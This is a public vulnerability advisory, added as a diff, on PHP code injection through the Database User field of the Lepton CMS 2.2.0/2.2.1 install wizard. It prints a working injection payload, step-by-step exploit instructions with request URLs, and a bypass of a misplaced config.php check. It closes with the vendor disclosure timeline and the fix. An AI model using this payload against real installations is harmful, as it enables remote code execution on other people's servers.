@@ -1,0 +1,141 @@
+[+] Credits: John Page (HYP3RLINX)
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/LEPTON-PHP-CODE-INJECTION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+==================
+www.lepton-cms.org
+
+
+
+Product:
+=================================
+Lepton CMS 2.2.0 / 2.2.1 (update)
+
+LEPTON is an easy-to-use but full customizable Content Management System
+(CMS).
+
+
+
+
+Vulnerability Type:
+===================
+PHP Code Injection
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+No input validation check is done on the "Database User" input field when
+entering Lepton CMS setup information using the Install Wizard.
+Therefore, a malicious user can input whatever they want in "config.php",
+this can allow for PHP Remote Command Execution on the Host system.
+
+e.g.
+
+In the database username field, single quote to close "DB_USERNAME" value
+then open our own PHP tags.
+
+');?><?php exec(`calc.exe`);?>
+
+Now in "config.php" the Database username becomes ===>
+define('DB_USERNAME', '');?><?php exec(`calc.exe`);?>');
+
+A security check attempt is made by Lepton to disallow making multiple HTTP
+requests for "config.php". On line 3 of "config.php" file we find.
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////
+
+if(defined('LEPTON_PATH')) { die('By security reasons it is not permitted
+to load \'config.php\' twice!!
+Forbidden call from \''.$_SERVER['SCRIPT_NAME'].'\'!'); }
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+However, the security check is placed on line 3 way before "LEPTON_PATH"
+has been defined allowing complete bypass of that access control check.
+Now we can inject our own PHP code into the config allowing Remote Command
+Execution or Local/Remote File Includes etc...
+
+Next, make HTTP GET request to "http://victim-server/upload/install/save.php"
+again and code execution will be achieved or request "config.php"
+directly as the security check made on line 3 of "config.php" to prevent
+multiple HTTP requests to "config.php" does NOT work anyhow.
+
+In situations where an installation script is provided as part of a some
+default image often available as a convenience by hosting providers, this
+can
+be used to gain code execution on the target system and bypass whatever
+security access controls/restrictions etc.
+
+References:
+http://www.lepton-cms.org/posts/important-lepton-2.2.2-93.php
+
+
+Exploit code(s):
+===============
+
+1) At step 4 of Leptons Install Wizard, enter ');?><?php
+exec(`calc.exe`);?> for Database User name, then fill in rest of fields
+
+2) Click go to step 5 and fill in required fields, then click "Install
+LEPTON"
+
+3) Make HTTP GET request to:
+
+ http://localhost/LEPTON_stable_2.2.0/upload/install/save.php
+
+  OR
+
+ http://localhost/LEPTON_stable_2.2.0/upload/config.php
+
+
+BOOM pop calc.exe...
+
+
+
+Disclosure Timeline:
+===========================================================
+Attempted Vendor Notification: June 11, 2016 (No replies)
+Vendor Notification on July 12, 2016 ( thanks Henri Salo )
+Vendor Acknowledgement: July 13, 2016
+Vendor fixes: July 14, 2016
+Vendor release version 2.2.2 : August 12, 2016
+August 15, 2016  : Public Disclosure
+
+
+
+
+Severity Level:
+================
+High
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
